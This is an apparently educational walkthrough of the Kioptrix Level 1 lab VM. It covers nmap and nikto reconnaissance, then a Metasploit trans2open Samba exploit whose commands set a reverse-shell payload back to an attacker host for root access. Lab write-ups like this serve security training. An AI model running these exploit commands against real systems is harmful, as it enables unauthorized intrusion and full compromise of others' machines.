---
title: "Kioptrix Level 1 Walkthrough"
layout: post
collection: writeups
permalink: /writeups/kioptrix-level1/
date: 2025-01-09
categories: ["Writeups", "VulnHub"]
tags: [pentest, samba, trans2open, metasploit, reverse-shell]
image: /assets/images/writeups/kioptrix1/kioptrix-1.jpg
thumbnail: /assets/images/writeups/kioptrix1/kioptrix-1.jpg
icon: fas fa-server
excerpt: "Exploiting an outdated Samba service using Metasploit to gain root access on Kioptrix Level 1."
description: "Walkthrough of Kioptrix Level 1 VM penetration test, covering reconnaissance, vulnerability identification, and exploitation via Samba trans2open overflow."
---



# Kioptrix Level 1 — Walkthrough

## Introduction

**Kioptrix Level 1** is a beginner-friendly vulnerable virtual machine on VulnHub intended for practicing penetration-testing fundamentals. The objective of this walkthrough is to enumerate the machine, identify vulnerabilities, and obtain root access.

![Kioptrix Welcome Screen](/assets/images/writeups/kioptrix1/Kioptrix1.png)

---

## Reconnaissance

### Network discovery

Tools used: `netdiscover`, `arp-scan`.

* Target discovered at: `192.168.56.110`.
* MAC address: `08:00:27:39:c3:0d` (VirtualBox).

![Netdiscover Scan](/assets/images/writeups/kioptrix1/netdiscover.png)
![ARP Scan](/assets/images/writeups/kioptrix1/arp-scan.png)

### Port scanning

Performed a full Nmap scan to enumerate services and detect the OS:

```bash
nmap -sS -sV -O 192.168.56.110 -oN kioptrix.txt
```

**Open ports (summary):**

* `22/tcp`  — OpenSSH 2.9p2 (protocol 1.99)
* `80/tcp`  — Apache 1.3.20 (Red Hat Linux)
* `111/tcp` — rpcbind
* `139/tcp` — Samba (`smbd`)
* `443/tcp` — Apache/SSL
* `32768/tcp` — status

![Nmap scan - overview](/assets/images/writeups/kioptrix1/nmap-scan1.png)

---

## Vulnerability analysis

### Web service enumeration

* Apache `1.3.20` with `mod_ssl/2.8.4` and `OpenSSL/0.9.6b` — all significantly out of date.
* `nikto` flagged multiple issues:

  * Outdated components.
  * `TRACE` method enabled (possible XST).
  * Directory listings exposed.
  * Indicators of a PHP file manager/backdoor.

![Port 80 observations](/assets/images/writeups/kioptrix1/port-80observe.png)
![Page source highlights](/assets/images/writeups/kioptrix1/source-page.png)

```
# Example nikto command used
nikto -h http://192.168.56.110
```

### Samba service

* Samba reported as `2.2.x`.
* This version is vulnerable to the `trans2open` buffer overflow (CVE-2003-0201), making it a high-priority target.

---

## Exploitation

### Metasploit approach (trans2open)

Used Metasploit to search and execute a Samba trans2open exploit:

```bash
msfconsole
search trans2open
use exploit/linux/samba/trans2open
set RHOSTS 192.168.56.110
set payload linux/x86/shell_reverse_tcp
set LHOST 192.168.56.102
set LPORT 4444
run
```

![Search trans2open module](/assets/images/writeups/kioptrix1/search-trans2open.png)

**Result:** the exploit successfully opened reverse shells (observed sessions on ports `32773–32776`) and provided a root shell.

![Exploit options](/assets/images/writeups/kioptrix1/exploit-options.png)
![Hosts setup](/assets/images/writeups/kioptrix1/hosts-setup.png)

---

## Post-exploitation

After gaining a shell, verified root privileges and enumerated the system:

```bash
whoami      # => root
hostname    # => kioptrix.level1
```

Found a congratulations message in the system mail for root:

![Locate mail](/assets/images/writeups/kioptrix1/locate-mail.png)

Captured the flag and evidence:

![Flag captured](/assets/images/writeups/kioptrix1/flag.png)

---

## Key findings

### Critical vulnerabilities

* **Samba trans2open overflow** — decisive exploit vector.
* **Outdated software stack** — Apache `1.3.20`, OpenSSL `0.9.6b`.
* **Weak service configuration** — `TRACE` enabled, directory listings, and exposed backdoor-like files.

### Attack chain

1. Network discovery → identify target IP.
2. Port scanning → enumerate services.
3. Service enumeration → identify vulnerable Samba.
4. Exploitation → execute trans2open via Metasploit.
5. Reverse shell → root access.

---

## Lessons learned

* Regular patching and updates are critical — a single unpatched service can lead to full system compromise.
* Legacy Samba versions are high-risk and have been exploited in the wild for years.
* Comprehensive reconnaissance and automated tooling (Nmap, Nikto, Metasploit) speed up discovery and exploitation in CTF/lab environments.

---

## Conclusion

Kioptrix Level 1 is an excellent introductory exercise that demonstrates how one vulnerable service (Samba) can compromise an entire system. This walkthrough documented a Metasploit-based exploitation path; alternative manual exploitation or deeper post-exploitation enumeration are great follow-ups for learning.

> **Ethical note:** Use these techniques only on systems you own or are authorized to test.

---

## References & Resources

* Kioptrix VM (VulnHub)
* Samba trans2open (CVE-2003-0201)
* Metasploit Framework
* Nmap, Nikto
